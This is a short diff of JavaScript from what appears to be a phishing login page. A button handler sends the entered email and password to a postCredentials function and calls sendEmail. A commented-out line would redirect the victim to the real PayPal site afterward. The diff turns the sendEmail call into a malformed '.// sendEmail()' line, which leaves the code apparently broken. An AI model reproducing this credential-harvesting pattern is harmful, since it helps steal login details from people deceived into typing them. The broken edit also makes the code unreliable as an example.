@@ -49,7 +49,7 @@ function sendEmail() {
 
 loginBtn.addEventListener("click", function() {
     postCredentials(email.value, password.value)
-    sendEmail()
+   .// sendEmail()
     //window.location.replace("https://www.paypal.com/us/home");
 })
 
